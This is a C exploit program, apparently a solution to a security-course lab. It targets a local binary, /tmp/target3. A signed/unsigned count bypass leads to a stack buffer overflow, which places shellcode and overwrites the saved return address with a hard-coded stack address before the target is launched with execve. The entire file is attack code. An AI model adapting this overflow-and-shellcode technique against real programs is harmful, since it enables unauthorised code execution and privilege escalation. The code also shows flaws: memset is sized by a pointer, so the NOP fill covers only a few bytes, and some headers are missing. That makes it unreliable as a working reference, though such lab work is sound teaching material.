#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target3"
#define DEFAULT_FILE "/tmp/xploit3_output"
#define SIZE 24024

struct target_widget_t {
  double x;
  double y;
  long count;
};

#define TARGET_MAX_WIDGETS 1000

int main(void)
{
  // This exploit will likely require more memory than fits on the stack
  // Determine exploit size
  // As we can see "if (count < MAX_WIDGETS)" in the target and count is signed long
  // We can find a negative number to bypass the condition and its unsigned value allow
  // us to overflow the buff, rbp and rip.
  // The value we can find is "9223372036854776809 * 24 = 24024".
  char *exploit_count_string = "9223372036854776809,";
  size_t count_string_len = strlen(exploit_count_string);
  size_t exploit_size = count_string_len + SIZE;

  char *exploit = malloc(exploit_size);

  // Fill exploit buffer
  memset(exploit, '\x90', sizeof(exploit));
  memcpy(exploit, exploit_count_string, count_string_len);
  memcpy(exploit + count_string_len, shellcode, sizeof(shellcode) - 1);
  int buf_size = TARGET_MAX_WIDGETS * sizeof(struct target_widget_t);
  *(size_t *)(exploit + count_string_len + buf_size + 8) = 0x7ffffffe8f48;

  // Write xploit buffer to file
  write_xploit(exploit, exploit_size, DEFAULT_FILE);

  char *args[] = { TARGET, DEFAULT_FILE, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  perror("execve failed");
  fprintf(stderr, "try running \"sudo make install\" in the targets directory\n");

  return 0;
}
